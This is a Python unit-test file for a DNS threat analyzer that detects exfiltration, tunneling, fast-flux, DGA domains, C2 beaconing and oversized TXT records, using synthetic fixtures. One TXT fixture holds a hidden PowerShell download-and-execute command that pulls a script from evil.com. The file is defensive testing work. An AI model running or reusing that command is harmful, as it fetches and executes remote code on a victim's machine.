"""Unit tests for DNS Exfiltration, Tunneling, Fast-Flux, and DGA forensics analyzer."""

import struct
from datetime import datetime, timedelta, timezone
from pathlib import Path

import pytest

from eft.analysis.dns_threat_analyzer import DNSThreatAnalyzer
from eft.models.dns_forensics import (
    DNSTunnelingMethod,
    FluxType,
)
from eft.models.pcap import DNSPacketInfo, DNSResourceRecord


@pytest.fixture
def dns_analyzer() -> DNSThreatAnalyzer:
    """Fixture providing an instance of DNSThreatAnalyzer."""
    return DNSThreatAnalyzer()


# -----------------------------------------------------------------------------
# 1. Mathematical, Entropy & Encoding Detection Tests
# -----------------------------------------------------------------------------


def test_shannon_entropy_calculation(dns_analyzer: DNSThreatAnalyzer) -> None:
    """Test Shannon entropy calculation on various strings."""
    # Empty string
    assert dns_analyzer.calculate_shannon_entropy("") == 0.0

    # Single character repetition (zero entropy)
    assert dns_analyzer.calculate_shannon_entropy("aaaaaaa") == 0.0

    # Normal English word
    normal_entropy = dns_analyzer.calculate_shannon_entropy("exampledomain")
    assert 2.5 <= normal_entropy <= 3.8

    # High entropy random base64 / hex string
    random_str = "4b9f8a2c1e7d3a0f5e8b4c2a1d7f0e9b"
    high_entropy = dns_analyzer.calculate_shannon_entropy(random_str)
    assert high_entropy >= 3.8


def test_detect_encoding_type(dns_analyzer: DNSThreatAnalyzer) -> None:
    """Test detection of hex, base32, base64, and binary encoding schemes."""
    # Hexadecimal
    assert dns_analyzer.detect_encoding_type("0123456789abcdef") == DNSTunnelingMethod.HEXADECIMAL

    # Base32
    assert dns_analyzer.detect_encoding_type("irxwo2lmmu3tgnbv") == DNSTunnelingMethod.BASE32

    # Base64URL
    assert dns_analyzer.detect_encoding_type("aB3-_dE91ZkmNqVw") == DNSTunnelingMethod.BASE64URL

    # Base64
    assert dns_analyzer.detect_encoding_type("VGVzdERhdGExMjM0NTY=") == DNSTunnelingMethod.BASE64


def test_extract_domain_parts(dns_analyzer: DNSThreatAnalyzer) -> None:
    """Test FQDN splitting into subdomain, apex, and registered domain."""
    sub, apex, clean = dns_analyzer.extract_domain_parts("data.exfil.malicious-c2.org.")
    assert apex == "malicious-c2.org"
    assert sub == "data.exfil"
    assert clean == "data.exfil.malicious-c2.org"

    sub2, apex2, clean2 = dns_analyzer.extract_domain_parts("google.com")
    assert apex2 == "google.com"
    assert sub2 == ""


# -----------------------------------------------------------------------------
# 2. Subdomain Entropy Analysis Tests
# -----------------------------------------------------------------------------


def test_subdomain_entropy_analysis(dns_analyzer: DNSThreatAnalyzer) -> None:
    """Test subdomain entropy analyzer on benign vs covert exfiltration queries."""
    # Benign normal query
    benign_analysis = dns_analyzer.analyze_subdomain_entropy("mail.google.com")
    assert not benign_analysis.is_suspicious
    assert benign_analysis.apex_domain == "google.com"

    # Malicious high-entropy covert data label
    covert_label = "4f8a2c1e7d3a0f5e8b4c2a1d7f0e9b4a.chunk1.exfil.attacker-c2.net"
    mal_analysis = dns_analyzer.analyze_subdomain_entropy(covert_label)
    assert mal_analysis.is_suspicious
    assert mal_analysis.apex_domain == "attacker-c2.net"
    assert mal_analysis.entropy >= 3.8
    assert len(mal_analysis.reasons) > 0


# -----------------------------------------------------------------------------
# 3. DNS Tunneling & Exfiltration Detection Tests
# -----------------------------------------------------------------------------


def test_dns_tunneling_detection(dns_analyzer: DNSThreatAnalyzer) -> None:
    """Test detection of DNS tunneling exfiltration channels (e.g. iodine / dnscat2)."""
    # Create a batch of simulated exfiltration queries under one apex domain
    queries = []
    base_apex = "covert-exfil.xyz"
    for i in range(15):
        chunk_hex = f"{i:02x}" + "a1b2c3d4e5f60718293a4b5c6d7e8f"
        fqdn = f"{chunk_hex}.{base_apex}"
        queries.append(DNSResourceRecord(name=fqdn, record_type="TXT"))

    queries_by_root = {base_apex: queries}
    alerts = dns_analyzer.detect_tunneling(queries_by_root)

    assert len(alerts) == 1
    alert = alerts[0]
    assert alert.apex_domain == base_apex
    assert alert.total_queries == 15
    assert alert.unique_subdomains_count == 15
    assert alert.high_entropy_queries_count >= 10
    assert alert.severity in ("HIGH", "CRITICAL")
    assert alert.estimated_exfiltrated_bytes > 400
    assert DNSTunnelingMethod.HEXADECIMAL in alert.detected_encodings


# -----------------------------------------------------------------------------
# 4. Fast-Flux & Double Fast-Flux Botnet Tests
# -----------------------------------------------------------------------------


def test_fast_flux_detection(dns_analyzer: DNSThreatAnalyzer) -> None:
    """Test identification of single and double Fast-Flux infrastructure."""
    domain = "botnet-flux-node.biz"

    # 6 distinct IP addresses across multiple /24 subnets with low TTL (60s)
    a_records = [
        DNSResourceRecord(name=domain, record_type="A", ttl=60, rdata="185.220.101.5"),
        DNSResourceRecord(name=domain, record_type="A", ttl=60, rdata="185.220.102.12"),
        DNSResourceRecord(name=domain, record_type="A", ttl=60, rdata="45.142.120.33"),
        DNSResourceRecord(name=domain, record_type="A", ttl=60, rdata="193.106.191.44"),
        DNSResourceRecord(name=domain, record_type="A", ttl=60, rdata="91.240.118.88"),
    ]

    answers_by_domain = {domain: a_records}
    alerts = dns_analyzer.detect_fast_flux(answers_by_domain)

    assert len(alerts) == 1
    alert = alerts[0]
    assert alert.domain == domain
    assert alert.flux_type == FluxType.SINGLE_FLUX
    assert alert.unique_a_ips_count == 5
    assert alert.min_ttl == 60
    assert alert.avg_ttl == 60.0
    assert len(alert.threat_indicators) > 0


def test_double_fast_flux_detection(dns_analyzer: DNSThreatAnalyzer) -> None:
    """Test identification of Double Fast-Flux where NS records also rapidly rotate."""
    domain = "bulletproof-flux.info"

    a_records = [
        DNSResourceRecord(name=domain, record_type="A", ttl=30, rdata="198.51.100.1"),
        DNSResourceRecord(name=domain, record_type="A", ttl=30, rdata="198.51.100.2"),
        DNSResourceRecord(name=domain, record_type="A", ttl=30, rdata="203.0.113.10"),
        DNSResourceRecord(name=domain, record_type="A", ttl=30, rdata="203.0.113.20"),
    ]

    ns_records = [
        DNSResourceRecord(name=domain, record_type="NS", ttl=30, rdata="ns1.flux-infra.net"),
        DNSResourceRecord(name=domain, record_type="NS", ttl=30, rdata="ns2.flux-infra.net"),
        DNSResourceRecord(name=domain, record_type="NS", ttl=30, rdata="ns3.flux-infra.net"),
    ]

    answers_by_domain = {domain: a_records}
    ns_by_domain = {domain: ns_records}

    alerts = dns_analyzer.detect_fast_flux(answers_by_domain, ns_by_domain)
    assert len(alerts) == 1
    assert alerts[0].flux_type == FluxType.DOUBLE_FLUX
    assert alerts[0].severity == "CRITICAL"


# -----------------------------------------------------------------------------
# 5. DGA (Domain Generation Algorithm) Tests
# -----------------------------------------------------------------------------


def test_dga_domain_detection(dns_analyzer: DNSThreatAnalyzer) -> None:
    """Test DGA detection on algorithmic domains vs benign domains."""
    # Benign domain
    assert dns_analyzer.detect_dga_domain("google.com") is None
    assert dns_analyzer.detect_dga_domain("wikipedia.org") is None

    # Consonant-heavy DGA (e.g. Conficker / Mirai style)
    dga_conficker = dns_analyzer.detect_dga_domain("bcdfghjklmnpqrst.com")
    assert dga_conficker is not None
    assert dga_conficker.confidence_score >= 0.60
    assert "consonant" in str(dga_conficker.reasons).lower()

    # High-entropy random alphanumeric DGA
    dga_random = dns_analyzer.detect_dga_domain("q8z9w3x7p2m4k1j5.biz")
    assert dga_random is not None
    assert dga_random.confidence_score >= 0.60

    # Hexadecimal hash DGA
    dga_hex = dns_analyzer.detect_dga_domain("a1b2c3d4e5f60718.net")
    assert dga_hex is not None
    assert dga_hex.predicted_dga_family in (
        "Hex/Alphanumeric DGA",
        "Hash-based DGA",
        "High-Entropy Random",
    )


# -----------------------------------------------------------------------------
# 6. Periodic DNS C2 Beaconing Tests
# -----------------------------------------------------------------------------


def test_dns_beaconing_detection(dns_analyzer: DNSThreatAnalyzer) -> None:
    """Test identification of periodic C2 beaconing with low jitter."""
    base_time = datetime(2026, 9, 21, 12, 0, 0, tzinfo=timezone.utc)
    domain = "c2-beacon-node.org"

    # Generate 6 periodic queries spaced exactly 10.0 seconds apart
    queries_with_ts = [
        (base_time + timedelta(seconds=i * 10.0), f"beacon{i}.{domain}") for i in range(6)
    ]

    analyses = dns_analyzer.detect_beaconing(queries_with_ts)
    assert len(analyses) == 1
    analysis = analyses[0]
    assert analysis.apex_domain == domain
    assert analysis.query_count == 6
    assert abs(analysis.mean_interval_seconds - 10.0) < 0.1
    assert analysis.interval_std_dev < 0.1
    assert analysis.regularity_score >= 0.90
    assert analysis.is_periodic_beacon


# -----------------------------------------------------------------------------
# 7. Large TXT Payload Smuggling Tests
# -----------------------------------------------------------------------------


def test_large_txt_payload_detection(dns_analyzer: DNSThreatAnalyzer) -> None:
    """Test flagging of oversized TXT records used for downstream staging."""
    large_payload = (
        "powershell -NoP -NonI -W Hidden -Exec Bypass -Command "
        "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')"
        + "A"
        * 100
    )
    records = [
        DNSResourceRecord(name="stage.malicious.net", record_type="TXT", rdata=large_payload),
        DNSResourceRecord(
            name="normal.example.com",
            record_type="TXT",
            rdata="v=spf1 include:_spf.google.com ~all",
        ),
    ]

    large_txts = dns_analyzer.detect_large_txt_payloads(records)
    assert len(large_txts) == 1
    assert large_txts[0].domain == "stage.malicious.net"
    assert large_txts[0].payload_length_bytes > 120
    assert large_txts[0].is_suspicious


# -----------------------------------------------------------------------------
# 8. Master Threat Report & PCAP Ingestion Tests
# -----------------------------------------------------------------------------


def test_analyze_domain_list(dns_analyzer: DNSThreatAnalyzer) -> None:
    """Test analyzing a list of raw domain names."""
    domains = [
        "google.com",
        "bcdfghjklmnpqrst.com",
        "4f8a2c1e7d3a0f5e8b4c2a1d7f0e9b4a.chunk1.exfil.attacker-c2.net",
    ]
    report = dns_analyzer.analyze_domain_list(domains)
    assert report.total_queries == 3
    assert len(report.dga_alerts) >= 1
    assert report.threat_score > 0.0


def test_analyze_dns_packets_full(dns_analyzer: DNSThreatAnalyzer) -> None:
    """Test full threat report generation from a structured list of DNSPacketInfo."""
    packets = [
        DNSPacketInfo(
            transaction_id=1,
            is_response=False,
            questions=[DNSResourceRecord(name="chunk1.exfil.covert.org", record_type="TXT")],
        ),
        DNSPacketInfo(
            transaction_id=2,
            is_response=True,
            rcode=0,
            rcode_name="NOERROR",
            questions=[DNSResourceRecord(name="chunk1.exfil.covert.org", record_type="TXT")],
            answers=[
                DNSResourceRecord(
                    name="chunk1.exfil.covert.org",
                    record_type="TXT",
                    rdata="ACK_CHUNK_1",
                )
            ],
        ),
        DNSPacketInfo(
            transaction_id=3,
            is_response=True,
            rcode=3,
            rcode_name="NXDOMAIN",
            questions=[DNSResourceRecord(name="nonexistent.covert.org", record_type="A")],
        ),
    ]

    report = dns_analyzer.analyze_dns_packets(packets)
    assert report.total_dns_packets == 3
    assert report.total_queries == 1
    assert report.total_responses == 2
    assert report.total_nxdomains == 1
    assert report.nxdomain_rate == 0.5


def test_analyze_pcap_synthetic(dns_analyzer: DNSThreatAnalyzer, tmp_path: Path) -> None:
    """Test end-to-end PCAP ingestion and DNS threat report extraction."""
    pcap_file = tmp_path / "synthetic_dns.pcap"

    # PCAP Global Header (24 bytes)
    global_hdr = struct.pack("<IHHiIII", 0xA1B2C3D4, 2, 4, 0, 0, 65535, 1)

    eth_hdr = b"\x00\x0c\x29\x12\x34\x56\x00\x50\x56\xc0\x00\x08\x08\x00"

    # DNS Header: ID 0x1234, Flags 0x0100 (standard query), 1 question, 0 answers
    dns_hdr = struct.pack("!HHHHHH", 0x1234, 0x0100, 1, 0, 0, 0)
    # Question: "test.example.com", Type A (1), Class IN (1)
    dns_question = b"\x04test\x07example\x03com\x00" + struct.pack("!HH", 1, 1)
    dns_payload = dns_hdr + dns_question

    udp_hdr = struct.pack("!HHHH", 54321, 53, len(dns_payload) + 8, 0)
    l4_data = udp_hdr + dns_payload

    ip_hdr = struct.pack(
        "!BBHHHBBH4s4s",
        0x45,
        0,
        len(l4_data) + 20,
        1,
        0,
        64,
        17,
        0,
        b"\xc0\xa8\x01\x32",
        b"\x08\x08\x08\x08",
    )

    pkt_data = eth_hdr + ip_hdr + l4_data
    pkt_hdr = struct.pack("<IIII", 1700000000, 500000, len(pkt_data), len(pkt_data))

    pcap_file.write_bytes(global_hdr + pkt_hdr + pkt_data)

    report = dns_analyzer.analyze_pcap(pcap_file)
    assert report.total_dns_packets >= 1
    assert report.total_queries >= 1
    assert report.unique_fqdns_count >= 1
    assert report.verdict == "BENIGN"
